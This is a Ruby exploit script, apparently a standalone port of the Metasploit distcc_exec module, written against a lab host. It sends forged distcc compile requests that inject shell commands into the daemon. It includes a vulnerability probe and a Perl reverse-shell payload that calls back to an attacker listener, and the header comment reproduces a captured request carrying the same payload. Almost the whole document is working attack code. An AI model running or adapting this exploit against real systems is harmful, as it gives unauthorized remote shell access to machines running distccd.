##
# Distributed Compiler daemon  
# Standalone version of exploit/unix/misc/distcc_exec
# with paylaod cmd/unix/reverse_perl
##

##
# Used msf source & Wireshark TCP stream dump to write the code
# Request
#DIST00000001ARGC00000008ARGV00000002shARGV00000002-cARGV000000e5perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"10.10.14.4:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'ARGV00000001#ARGV00000002-cARGV00000006main.cARGV00000002-oARGV00000006main.oDOTI0000000AWEKvoYoCCu
# response
#DONE00000001STAT00000000SERR00000000SOUT00000000DOTO00000000
#

require 'socket'

RHOST="10.10.10.3"
RPORT="3632"
LHOST="10.10.14.4"
LPORT="4444"


def rand_text_alphanumeric(len)
    ('a'..'z').to_a.shuffle[0,len].join
end


def dist_cmd(*args)

    # Convince distccd that this is a compile
    args.concat(%w{# -c main.c -o main.o})

    # Set distcc 'magic fairy dust' and argument count
    res = "DIST00000001" + sprintf("ARGC%.8x", args.length)

    # Set the command arguments
    args.each do |arg|
      res << sprintf("ARGV%.8x%s", arg.length, arg)
    end

    return res
end


def test_vulnerable()
  puts "Testing if host is vulnerable"
  puts "Connecting..."
  sock = TCPSocket.open(RHOST, RPORT)


  r = rand_text_alphanumeric(10)
  req = dist_cmd("sh", "-c", "echo #{r}")
  dtag = rand_text_alphanumeric(10)
  req = req+"DOTI0000000A#{dtag}\n"

  puts "Sending ["+req+"]"
  sock.puts(req)

  out = sock.gets
  puts "Reading"
  #puts "err="+err?err:"null"
  if out
      puts "out="+out
  end
  if out && out.index(r)
      puts "Vulnerable"
  else
      puts "not vulnerable"
  end
  puts "Closing..."
  sock.close()
end

# msf payload cmd/unix/reverse_perl
def exploit_reverse_perl()
  puts"Exploiting with reverse_perl"
  puts"Please open a nc"
  puts "$ nc -l -p "+LPORT
  puts "Connecting..."
  sock = TCPSocket.open(RHOST, RPORT)

  payload = "perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,\""+LHOST+":"+LPORT+"\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'"
  req = dist_cmd("sh", "-c", payload)
  dtag = rand_text_alphanumeric(10)
  req = req+"DOTI0000000A#{dtag}\n"

  puts "sending payload"
  #puts "sending ["+req+"]"
  sock.puts(req)

  #begin
      #out = sock.gets
  #rescue IOError => e
  #    puts e.message
  #end
  #puts "return"
  #puts "err="+err?err:"null"
  #if out
  #   puts "out="+out
  #end

  #puts "Wait 20s"
  #sleep 20
  puts "Closing..."
  sock.close()
end

def exploit(cmd) ### Still buged :)
  puts "Connecting..."
  sock = TCPSocket.open(RHOST, RPORT)

  req = dist_cmd("sh", "-c", "#{cmd}")
  dtag = rand_text_alphanumeric(10)
  req = req+"DOTI0000000A#{dtag}\n"

  puts "sending ["+req+"]"
  sock.puts(req)

  out = sock.gets
  puts "return"
  #puts "err="+err?err:"null"
  if out
      puts "out="+out
  end

  puts "Closing..."
  sock.close()
end


#exploit("'ls -al /'")
exploit_reverse_perl()
